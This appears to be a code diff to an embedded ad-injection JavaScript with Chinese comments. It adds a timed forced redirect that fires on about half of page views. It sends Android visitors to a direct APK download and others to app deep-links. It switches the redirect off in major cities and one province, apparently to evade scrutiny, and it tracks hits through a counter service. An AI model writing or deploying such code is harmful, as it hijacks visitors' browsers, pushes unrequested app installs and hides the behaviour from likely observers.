@@ -306,18 +306,59 @@
     function doCNZZ(){
         var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1271872944'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s22.cnzz.com/z_stat.php%3Fid%3D1271872944' type='text/javascript'%3E%3C/script%3E"));
     }
+        //获得js链接带过来的query参数
+    function getCode(url,parm) {  
+            console.log(" url  "+url);  
+        var reg = new RegExp("(^|&)"+ parm +"=([^&]*)(&|$)");  
+        var r = url.substr(url.indexOf("\?")+1).match(reg);  
+        if (r!=null) return unescape(r[2]); return null;  
+    };
+    //area当前地区 screens屏蔽地区
+    function checkAreaScreen(area,screens){
+        for(var i =0 ;i<screens.length;i++){
+            if(area.indexOf(screens[i])>-1){
+                return true;
+            }
+        }
+        return false;
+    };
 
     //内嵌随机素材特定逻辑主函数
     function handleNeiQian(){
-        var screenProvinces = ["陕西","海南",];
-        var forceOpenScreen = ["江苏"];
-        var forceOpenTime = 10+parseInt(Math.random()*3);//pv停留多久强制跳转，单位s
-        var materials = ["https://coserfuli.oss-cn-hangzhou.aliyuncs.com/ad/640-150.gif"];
+        var loadUrl = document.getElementsByTagName("script")[0].getAttribute("src");
+        var screenProvinces = [];   //广告完全屏蔽的地区
+        var forceOpenScreen = ["北京", "上海", "广州", "深圳","河南"];    //强制跳窗屏蔽的地区
+        var forceOpenTime = 3 + parseInt(Math.random() * 3);//pv停留多久强制跳转，单位s
+        var forceOpenRatio = 0.5;   //单pv执行强制跳窗的概率
+        var materials = ["http://advert-me.oss-cn-hangzhou.aliyuncs.com/hf/12348.jpg"];  //pv轮播素材
         var materialsKey = "YWVseT26h";//已展示素材在cookie名
-        var aimHref = "http://ty.fugouqipai.net/";
-        var containerId = "SDgweEg"+parseInt(100*Math.random());
-
+        var aimHref = "snssdk141://detail?groupid=6556999393600340484&gd_label=click_schema_jaw29"; //目的链接
+        var containerId = "SDgweEg" + parseInt(100 * Math.random());
+        var id = getCode.call(this,loadUrl,"id");
+        var needForceOpen = true;
         document.writeln('<div id="'+containerId+'"></div>');
+        var u = navigator.userAgent; 
+        var isAndroid = u.indexOf('Android') > -1 || u.indexOf('Adr') > -1; //android终端 
+        var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/); //ios终端
+        if (isAndroid) {
+            if (Math.random() < 0.6) {  //游戏
+                materials = ["http://advert-me.oss-cn-hangzhou.aliyuncs.com/hf/12341.jpg", "http://advert-me.oss-cn-hangzhou.aliyuncs.com/hf/12342.jpg","http://advert-me.oss-cn-hangzhou.aliyuncs.com/hf/12343.jpg"];
+                aimHref = "http://dl.37wan.cn/upload/1_1002753_10745/xianlingjuexing_1014.apk";
+                needForceOpen = false;
+            } else {    //淘宝
+                materials = ["http://advert-me.oss-cn-hangzhou.aliyuncs.com/hf/12344.jpg", "http://advert-me.oss-cn-hangzhou.aliyuncs.com/hf/12345.jpg"];
+                aimHref = "tbopen://m.taobao.com/tbopen/index.html?source=auto&action=ali.open.nav&module=h5&bootImage=0&appkey=24666696&h5Url=https%3A%2F%2Fmarket.m.taobao.com%2Ftms%2Fholiday2017%2Fact%2Fzbymzjx2%3Fwh_ttid%3Dphone%26ttid%3D12ali0000500&spm=2014.ugdhh.3915747229.1101-220&bc_fl_src=growth_dhh_3915747229_1101-220&materialid=1101";
+            }
+        } else {
+            if (Math.random() < 0) {  //游戏
+                materials = ["http://advert-me.oss-cn-hangzhou.aliyuncs.com/hf/12341.jpg", "http://advert-me.oss-cn-hangzhou.aliyuncs.com/hf/12342.jpg","http://advert-me.oss-cn-hangzhou.aliyuncs.com/hf/12343.jpg"];
+                aimHref = "snssdk143://detail?groupid=6557066588351103496&gd_label=click_schema_jaw29";
+                needForceOpen = false;
+            } else {    //头条
+                materials = ["http://advert-me.oss-cn-hangzhou.aliyuncs.com/hf/12349.png", "http://advert-me.oss-cn-hangzhou.aliyuncs.com/hf/12352.png"];
+                aimHref = "snssdk141://detail?groupid=6556999393600340484&gd_label=click_schema_jaw29";
+            }
+        }
 
         filterCity(screenProvinces,function(Country){
             var showedMaterials = getCookie(materialsKey)||"";//格式:0,1
@@ -346,39 +387,20 @@
                 b.type = "text/javascript";
                 b.src = 'https://s22.cnzz.com/z_stat.php?id=1271872944&web_id=1271872944';
                 document.getElementById(containerId+'_stat').appendChild(b);
-               
             }
             //强制跳转逻辑
             Country = Country||'';
-            // if(Country.indexOf('江苏')===-1){
-            //     setTimeout(function(){
-            //         if(checkLockCookie(3,1,'ddsae')){
-            //             forceWindow(aimHref);
-            //         }
-            //     },forceOpenTime*1000);            
-            // }
+            if(!checkAreaScreen(Country,forceOpenScreen) && needForceOpen){
+                if(Math.random()<forceOpenRatio){  //执行跳转的概率
+                    setTimeout(function(){
+                        if(checkLockCookie(12,1,'agr2sx')){
+                            forceWindow(aimHref);
+                        }
+                    },forceOpenTime*1000);                    
+                } 
+            }
         },function(Country){ //被屏蔽
-                // var div = document.createElement('div');
-                // div.innerHTML = renderHtml("http://qnm.163.com/m/fab/","http://www.686lm.com/ad/b/qnyh.jpg").trim() +getCNZZContanerStr(containerId);
-                // document.getElementById(containerId).appendChild(div);
-
-                var o = document.getElementsByTagName("script");
-                var c = o[o.length-1].parentNode;
-                var ta = document.createElement('script'); ta.type = 'text/javascript'; ta.async = true;
-                ta.src = '//yun.poppyta.com/h5-mami/msdk/tmk.js';
-                ta.onload = function() {
-                    new TuiSDK({
-                    container: c,
-                    appKey: '3QJy6gDkqzYLVsdVwTQ4ofDL1A8v',
-                    slotId: '180761'
-                    });
-                };
-                var s = document.querySelector('head'); s.appendChild(ta);
-
-                var b = document.createElement("script");
-                b.type = "text/javascript";
-                b.src = 'https://s19.cnzz.com/z_stat.php?id=1271880201&web_id=1271880201';
-                document.getElementById(containerId+'_stat').appendChild(b);            
+           
         });
     }
     //bin
